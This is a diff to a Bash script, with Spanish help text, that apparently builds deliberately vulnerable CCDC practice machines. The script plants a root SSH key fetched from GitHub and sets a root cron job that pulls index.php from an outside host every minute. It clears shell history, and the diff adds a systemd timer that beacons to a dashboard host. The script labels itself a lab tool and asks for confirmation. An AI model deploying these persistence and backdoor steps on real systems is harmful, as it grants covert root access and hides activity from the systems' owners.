@@ -13,6 +13,10 @@ WEB_REPO_URL="${WEB_REPO_URL:-https://github.com/banago/simple-php-website.git}"
 INDEX_URL="${INDEX_URL:-https://raw.githubusercontent.com/4rji/ccdc/main/index.php}"
 ROOT_KEY_URL="${ROOT_KEY_URL:-https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub}"
 CRON_LINE="${CRON_LINE:-* * * * * curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php}"
+CANARY_URL="${CANARY_URL:-http://172.16.101.77:8081/checkin}"
+CANARY_INTERVAL="${CANARY_INTERVAL:-3}"
+CANARY_SERVICE="redhavi-canary.service"
+CANARY_TIMER="redhavi-canary.timer"
 
 usage() {
     cat <<'EOF'
@@ -28,11 +32,13 @@ Variables opcionales:
   INDEX_URL      index.php usado para reemplazar paginas web.
   ROOT_KEY_URL   Clave publica que se instalaria en /root/.ssh/authorized_keys.
   CRON_LINE      Linea exacta que se agregaria al crontab de root.
+  CANARY_URL     Endpoint del dashboard (default: http://172.16.101.77:8081/checkin).
+  CANARY_INTERVAL Minutos entre check-ins (default: 3).
 
 Advertencia:
   Este script instala paquetes inseguros, modifica webroot, crea usuarios,
-  agrega una clave SSH para root, deja una tarea cron de laboratorio y borra
-  historial de shell al terminar.
+  agrega una clave SSH para root, deja tareas cron y systemd de laboratorio,
+  y borra historial de shell al terminar.
   Ejecutalo solo en maquinas autorizadas y descartables.
 EOF
 }
@@ -69,6 +75,13 @@ confirm_apply() {
     printf 'Escribe LAB para continuar: '
     read -r answer
     [ "$answer" = "LAB" ] || die "Cancelado."
+}
+
+validate_canary_settings() {
+    [[ "$CANARY_URL" =~ ^https?://[^[:space:]]+$ ]] \
+        || die "CANARY_URL debe ser una URL http(s) sin espacios."
+    [[ "$CANARY_INTERVAL" =~ ^[1-9][0-9]*$ ]] \
+        || die "CANARY_INTERVAL debe ser un numero entero mayor que cero."
 }
 
 require_root() {
@@ -221,6 +234,55 @@ setup_cron() {
     rm -f "$tmp_cron"
 }
 
+write_systemd_unit() {
+    local path="$1"
+    local content="$2"
+
+    if [ "$DRY_RUN" -eq 1 ]; then
+        log "Se escribiria $path"
+        return 0
+    fi
+
+    printf '%s\n' "$content" >"$path"
+    chmod 644 "$path"
+}
+
+setup_canary_timer() {
+    local service_path="/etc/systemd/system/$CANARY_SERVICE"
+    local timer_path="/etc/systemd/system/$CANARY_TIMER"
+    local systemd_canary_url="${CANARY_URL//%/%%}"
+    local service_content
+    local timer_content
+
+    log "Configurando check-in al dashboard cada $CANARY_INTERVAL minutos..."
+
+    service_content="[Unit]
+Description=Redhavi CCDC dashboard check-in
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/bin/curl -fsS --max-time 15 -o /dev/null $systemd_canary_url"
+
+    timer_content="[Unit]
+Description=Run the Redhavi dashboard check-in periodically
+
+[Timer]
+OnBootSec=1min
+OnUnitActiveSec=${CANARY_INTERVAL}min
+AccuracySec=10s
+Unit=$CANARY_SERVICE
+
+[Install]
+WantedBy=timers.target"
+
+    write_systemd_unit "$service_path" "$service_content"
+    write_systemd_unit "$timer_path" "$timer_content"
+    run systemctl daemon-reload
+    run systemctl enable --now "$CANARY_TIMER"
+}
+
 enable_httpd() {
     log "Iniciando y habilitando httpd..."
     run systemctl start httpd
@@ -321,6 +383,7 @@ parse_args() {
 
 main() {
     parse_args "$@"
+    validate_canary_settings
     detect_os
     require_root
     confirm_apply
@@ -328,6 +391,7 @@ main() {
     install_packages
     setup_web
     setup_cron
+    setup_canary_timer
     enable_httpd
     setup_users
     setup_root_ssh_key
